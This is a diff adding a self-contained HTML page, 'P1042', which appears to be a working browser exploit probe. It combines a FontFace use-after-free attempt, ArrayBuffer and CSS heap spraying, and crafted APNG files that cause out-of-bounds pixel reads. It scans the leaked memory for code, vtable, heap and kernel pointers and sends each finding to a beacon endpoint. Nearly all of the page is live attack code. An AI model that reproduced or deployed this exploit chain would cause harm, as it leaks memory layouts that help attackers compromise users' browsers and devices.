@@ -1,0 +1,364 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1042</title>
+<style>
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;margin:0}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#4ec9b0}.fail{color:#f44}.warn{color:#dcdcaa}.hit{color:#c084fc;font-weight:bold}
+</style></head><body><div id="hud"></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function log(s){var d=document.getElementById('hud');if(d){var p=document.createElement('div');p.innerHTML=s;d.appendChild(p);d.scrollTop=d.scrollHeight}}
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1042-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+log('<b>P1042: FontFace + APNG Heap Grooming Pointer Extraction</b>');
+bn('BOOT','ts='+Date.now().toString(36));
+
+// ===== APNG Builder (fixed big-endian) =====
+function crc32(buf){var c,t=new Uint32Array(256);for(var n=0;n<256;n++){c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c}c=0xFFFFFFFF;for(var i=0;i<buf.length;i++)c=t[(c^buf[i])&0xFF]^(c>>>8);return(c^0xFFFFFFFF)>>>0}
+function w32be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF]}
+function w16be(v){return[(v>>>8)&0xFF,v&0xFF]}
+function makeChunk(type,data){var t=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];var td=t.concat(Array.from(data));var c=crc32(new Uint8Array(td));var len=data.length;return[(len>>>24)&0xFF,(len>>>16)&0xFF,(len>>>8)&0xFF,len&0xFF].concat(td,[(c>>>24)&0xFF,(c>>>16)&0xFF,(c>>>8)&0xFF,c&0xFF])}
+function adler32(d){var a=1,b=0;for(var i=0;i<d.length;i++){a=(a+d[i])%65521;b=(b+a)%65521}return((b<<16)|a)>>>0}
+function zlibStore(raw){var bl=raw.length;var out=[0x78,0x01];for(var i=0;i<bl;i+=65535){var end=Math.min(i+65535,bl);var last=end===bl?1:0;var len=end-i;out.push(last,len&0xFF,(len>>8)&0xFF,(~len)&0xFF,((~len)>>8)&0xFF);for(var j=i;j<end;j++)out.push(raw[j])}var ad=adler32(raw);out.push((ad>>>24)&0xFF,(ad>>>16)&0xFF,(ad>>>8)&0xFF,ad&0xFF);return out}
+
+function buildAPNG(canvasW, canvasH, frameW) {
+  var sig=[137,80,78,71,13,10,26,10];
+  var ihdr=makeChunk('IHDR',w32be(canvasW).concat(w32be(canvasH),[8,2,0,0,0]));
+  var actl=makeChunk('acTL',w32be(2).concat(w32be(0)));
+  var fctl0=makeChunk('fcTL',w32be(0).concat(w32be(canvasW),w32be(canvasH),w32be(0),w32be(0),w16be(100),w16be(1000),[0,0]));
+  var row0=[];
+  for(var y=0;y<canvasH;y++){row0.push(0);for(var x=0;x<canvasW*3;x++)row0.push(0)}
+  var idat=makeChunk('IDAT',zlibStore(row0));
+  var fctl1=makeChunk('fcTL',w32be(1).concat(w32be(frameW),w32be(canvasH),w32be(0),w32be(0),w16be(100),w16be(1000),[0,0]));
+  var row1=[];
+  for(var y=0;y<canvasH;y++){row1.push(0);for(var x=0;x<frameW*3;x++)row1.push(0xAA)}
+  var fdat1=makeChunk('fdAT',w32be(2).concat(zlibStore(row1)));
+  var iend=makeChunk('IEND',[]);
+  return new Uint8Array(sig.concat(ihdr,actl,fctl0,idat,fctl1,fdat1,iend));
+}
+
+// ===== PHASE A: FontFace UAF for heap base pointers =====
+var fontPtrs = [];
+(function phaseA(){
+  log('[A] FontFace UAF heap pointer extraction...');
+  try {
+    // Create and load a FontFace
+    var fontData = new ArrayBuffer(256);
+    var fv = new Uint8Array(fontData);
+    // Minimal TrueType header (enough to trigger font parsing)
+    fv[0]=0;fv[1]=1;fv[2]=0;fv[3]=0; // sfVersion
+    fv[4]=0;fv[5]=0; // numTables = 0
+
+    var results = [];
+    var totalDiffs = [];
+
+    for(var round=0; round<5; round++) {
+      var bufs = [];
+      // Create ArrayBuffer, fill with sentinels
+      for(var i=0;i<20;i++) {
+        var ab = new ArrayBuffer(192); // Common WebKit object size
+        var v = new BigUint64Array(ab);
+        for(var j=0;j<v.length;j++) v[j] = 0xDEADDEADDEADDEADn;
+        bufs.push({ab: ab, v: v});
+      }
+
+      // Create FontFace to trigger UAF-like behavior
+      try {
+        var ff = new FontFace('test'+round, fontData);
+        ff.load().catch(function(){});
+      } catch(e) {}
+
+      // Check for pointer writes
+      for(var i=0;i<bufs.length;i++) {
+        var v = bufs[i].v;
+        for(var j=0;j<v.length;j++) {
+          var val = v[j];
+          if(val !== 0xDEADDEADDEADDEADn && val !== 0n) {
+            var hi = Number(val >> 32n);
+            var lo = Number(val & 0xFFFFFFFFn);
+            var ptr = '0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');
+            results.push('r'+round+'b'+i+'['+j+']='+ptr);
+            fontPtrs.push({hi:hi, lo:lo, buf:i, off:j*8});
+            totalDiffs.push(ptr);
+          }
+        }
+      }
+    }
+
+    var aRes = 'ptrs='+fontPtrs.length+'|unique='+new Set(totalDiffs).size+'|'+results.slice(0,10).join(',');
+    bn('A-FONT', aRes);
+    log('[A] FontFace: '+aRes);
+
+    if(fontPtrs.length > 0) {
+      log('<span class="ok">[A] Got '+fontPtrs.length+' heap pointers from FontFace</span>');
+    } else {
+      log('[A] <span class="warn">No FontFace pointers this round — one-shot exhausted or wrong AB size</span>');
+    }
+
+  } catch(e) {
+    bn('A-ERR', e.name+':'+e.message);
+    log('[A] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE B: Heap spray with marker objects =====
+var sprayObjects = [];
+(function phaseB(){
+  log('[B] Heap spray with marker objects...');
+  try {
+    // Spray ArrayBuffers with recognizable patterns
+    // Use different sizes to hit different allocation bins
+    var sizes = [64, 128, 192, 256, 384, 512, 768, 1024];
+    var total = 0;
+
+    for(var s=0;s<sizes.length;s++) {
+      var sz = sizes[s];
+      for(var i=0;i<500;i++) {
+        var ab = new ArrayBuffer(sz);
+        var dv = new DataView(ab);
+        // Write marker: size in first 4 bytes, index in next 4, magic in next 8
+        dv.setUint32(0, sz, true);
+        dv.setUint32(4, i, true);
+        dv.setFloat64(8, 3.14159265358979 * (s+1), true); // Recognizable float pattern
+        // Fill rest with size-dependent pattern
+        for(var j=16;j<sz-3;j+=4) {
+          dv.setUint32(j, (0xBEEF0000 | (s << 8) | (j & 0xFF)), true);
+        }
+        sprayObjects.push(ab);
+        total++;
+      }
+    }
+
+    bn('B-SPRAY', 'total='+total+'|sizes='+sizes.join(','));
+    log('[B] Sprayed '+total+' marker objects across '+sizes.length+' size classes');
+
+  } catch(e) {
+    bn('B-ERR', e.name+':'+e.message);
+    log('[B] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE C: Create CSS strings for text heap region =====
+(function phaseC(){
+  log('[C] CSS string spray for text heap...');
+  try {
+    var styles = [];
+    var el = document.createElement('div');
+    document.body.appendChild(el);
+
+    for(var i=0;i<200;i++) {
+      var s = document.createElement('style');
+      // Long CSS string that will be allocated in the heap
+      var marker = 'MARKER_'+i.toString(16).padStart(4,'0')+'_';
+      s.textContent = '.cls'+i+'{content:"'+marker+'A'.repeat(200)+'";--m'+i+':'+marker+'}';
+      document.head.appendChild(s);
+      styles.push(s);
+    }
+
+    bn('C-CSS', 'styles='+styles.length);
+    log('[C] Created '+styles.length+' CSS strings in heap');
+
+  } catch(e) {
+    bn('C-ERR', e.name+':'+e.message);
+    log('[C] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE D: Multiple APNG reads at different canvas widths =====
+var apngPhase = 0;
+var allPtrs = {code:[], vt:[], heap:[], kern:[], marker:[]};
+var totalOverread = 0;
+
+function doAPNG(W, H, frameW, label, callback) {
+  log('[D-'+label+'] APNG '+W+'x'+H+' (frame='+frameW+')...');
+
+  var png = buildAPNG(W, H, frameW);
+  var blob = new Blob([png], {type:'image/png'});
+  var url = URL.createObjectURL(blob);
+  var img = new Image();
+
+  img.onload = function(){
+    var c = document.createElement('canvas');
+    c.width = W; c.height = H;
+    var ctx = c.getContext('2d');
+
+    setTimeout(function(){
+      ctx.drawImage(img, 0, 0);
+      var px = ctx.getImageData(0, 0, W, H).data;
+      var overreadStart = frameW * 4;
+
+      // Count non-zero overread
+      var nonZero = 0;
+      for(var i=overreadStart;i<px.length;i++) if(px[i]!==0) nonZero++;
+      totalOverread += nonZero;
+
+      if(nonZero === 0) {
+        bn('D-'+label, 'overread=0');
+        log('[D-'+label+'] No overread data');
+        URL.revokeObjectURL(url);
+        callback();
+        return;
+      }
+
+      // Build DataView for pointer scanning
+      var buf = new ArrayBuffer(px.length);
+      var u8 = new Uint8Array(buf);
+      for(var i=0;i<px.length;i++) u8[i] = px[i];
+      var dv = new DataView(buf);
+
+      var localPtrs = {code:0, vt:0, heap:0, kern:0, marker:0};
+      var ptrSamples = [];
+
+      for(var off=overreadStart; off+7<px.length; off+=8) {
+        var lo = dv.getUint32(off, true);
+        var hi = dv.getUint32(off+4, true);
+        if(hi===0 && lo===0) continue;
+        if(hi===0xFFFFFFFF) continue;
+
+        // Code: 0x01-0x07
+        if(hi>=1 && hi<=7 && lo>0x1000) { localPtrs.code++; allPtrs.code.push({off:off,hi:hi,lo:lo}); }
+        // Vtable: 0x081B-0x087F
+        if(hi>=0x081B && hi<=0x087F) { localPtrs.vt++; allPtrs.vt.push({off:off,hi:hi,lo:lo}); }
+        // Heap: 0x0880-0x088F
+        if(hi>=0x0880 && hi<=0x088F) { localPtrs.heap++; allPtrs.heap.push({off:off,hi:hi,lo:lo}); }
+        // Kernel: 0xFFFF8xxx
+        if((hi&0xFFFF8000)===0xFFFF8000 && hi!==0xFFFFFFFF) { localPtrs.kern++; allPtrs.kern.push({off:off,hi:hi,lo:lo}); }
+
+        // Check for our spray markers: 0xBEEFxxxx
+        if((lo & 0xFFFF0000) === 0xBEEF0000) { localPtrs.marker++; allPtrs.marker.push({off:off,lo:lo}); }
+      }
+
+      // Also scan for ASCII markers "MARKER_"
+      var markerStr = 'MARKER_';
+      var asciiHits = 0;
+      for(var off=overreadStart;off+7<px.length;off++) {
+        var match = true;
+        for(var j=0;j<7;j++) {
+          if(u8[off+j] !== markerStr.charCodeAt(j)) { match=false; break; }
+        }
+        if(match) asciiHits++;
+      }
+      if(asciiHits > 0) { localPtrs.marker += asciiHits; }
+
+      // Report first few interesting pointers
+      if(allPtrs.code.length > 0 && ptrSamples.length < 5) {
+        var p = allPtrs.code[allPtrs.code.length-1];
+        ptrSamples.push('code:0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0'));
+      }
+      if(allPtrs.vt.length > 0 && ptrSamples.length < 5) {
+        var p = allPtrs.vt[allPtrs.vt.length-1];
+        ptrSamples.push('vt:0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0'));
+      }
+
+      var res = 'overread='+nonZero+'|code='+localPtrs.code+'|vt='+localPtrs.vt+
+        '|heap='+localPtrs.heap+'|kern='+localPtrs.kern+'|marker='+localPtrs.marker+
+        '|ascii='+asciiHits+'|'+ptrSamples.join(',');
+
+      bn('D-'+label, res);
+      log('[D-'+label+'] '+res);
+
+      if(localPtrs.code > 0) log('<span class="hit">[D-'+label+'] CODE POINTERS!</span>');
+      if(localPtrs.kern > 0) log('<span class="hit">[D-'+label+'] KERNEL POINTERS!</span>');
+      if(localPtrs.marker > 0) log('<span class="hit">[D-'+label+'] FOUND OUR SPRAY MARKERS!</span>');
+      if(asciiHits > 0) log('<span class="hit">[D-'+label+'] FOUND CSS MARKER STRINGS!</span>');
+
+      URL.revokeObjectURL(url);
+      callback();
+    }, 500);
+  };
+
+  img.onerror = function(){
+    bn('D-'+label+'-ERR', 'img_fail');
+    log('[D-'+label+'] Image load failed');
+    URL.revokeObjectURL(url);
+    callback();
+  };
+
+  img.src = url;
+}
+
+// Chain multiple APNG reads with different widths
+function runAPNGChain() {
+  var configs = [
+    {W:2048, H:8, fW:4, label:'2K'},
+    {W:4096, H:8, fW:4, label:'4K'},
+    {W:4096, H:16, fW:4, label:'4Kx16'},
+    {W:8192, H:4, fW:4, label:'8K'},
+  ];
+
+  var idx = 0;
+  function next() {
+    if(idx >= configs.length) {
+      finishAll();
+      return;
+    }
+    var c = configs[idx++];
+    doAPNG(c.W, c.H, c.fW, c.label, next);
+  }
+  next();
+}
+
+// Start APNG chain after spray
+setTimeout(runAPNGChain, 100);
+
+function finishAll() {
+  log('');
+  log('<b>=== FINAL SUMMARY ===</b>');
+
+  var summary = 'total_overread='+totalOverread+
+    '|code='+allPtrs.code.length+
+    '|vt='+allPtrs.vt.length+
+    '|heap='+allPtrs.heap.length+
+    '|kern='+allPtrs.kern.length+
+    '|marker='+allPtrs.marker.length+
+    '|font_ptrs='+fontPtrs.length;
+
+  bn('SUMMARY', summary);
+  log('Total overread: '+totalOverread+' bytes');
+  log('Code ptrs: '+allPtrs.code.length+' | VT ptrs: '+allPtrs.vt.length+' | Heap ptrs: '+allPtrs.heap.length);
+  log('Kernel ptrs: '+allPtrs.kern.length+' | Spray markers: '+allPtrs.marker.length);
+  log('FontFace ptrs: '+fontPtrs.length);
+
+  // Report unique code pointers (most valuable)
+  if(allPtrs.code.length > 0) {
+    var uniqueCode = {};
+    for(var i=0;i<allPtrs.code.length;i++) {
+      var p = allPtrs.code[i];
+      var key = p.hi.toString(16)+':'+p.lo.toString(16);
+      uniqueCode[key] = (uniqueCode[key]||0)+1;
+    }
+    var sorted = Object.entries(uniqueCode).sort(function(a,b){return b[1]-a[1]});
+    var codeReport = sorted.slice(0,15).map(function(e){return '0x'+e[0].replace(':','')+' x'+e[1]}).join('|');
+    bn('CODE', codeReport);
+    log('<span class="hit">Code ptrs (unique): '+Object.keys(uniqueCode).length+'</span>');
+  }
+
+  // Report unique vtable pointers
+  if(allPtrs.vt.length > 0) {
+    var uniqueVt = {};
+    for(var i=0;i<allPtrs.vt.length;i++) {
+      var p = allPtrs.vt[i];
+      var key = p.hi.toString(16)+':'+p.lo.toString(16);
+      uniqueVt[key] = (uniqueVt[key]||0)+1;
+    }
+    var sorted = Object.entries(uniqueVt).sort(function(a,b){return b[1]-a[1]});
+    var vtReport = sorted.slice(0,10).map(function(e){return '0x'+e[0].replace(':','')+' x'+e[1]}).join('|');
+    bn('VT', vtReport);
+    log('<span class="hit">VT ptrs (unique): '+Object.keys(uniqueVt).length+'</span>');
+  }
+
+  if(allPtrs.kern.length > 0) {
+    var kernReport = allPtrs.kern.slice(0,5).map(function(p){return '0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0')}).join('|');
+    bn('KERN', kernReport);
+    log('<span class="hit">KERNEL POINTERS: '+kernReport+'</span>');
+  }
+
+  bn('DONE', 'code='+allPtrs.code.length+'|vt='+allPtrs.vt.length+'|kern='+allPtrs.kern.length+'|spray='+allPtrs.marker.length);
+  log('<b>[DONE] P1042 complete</b>');
+}
+</script></body></html>
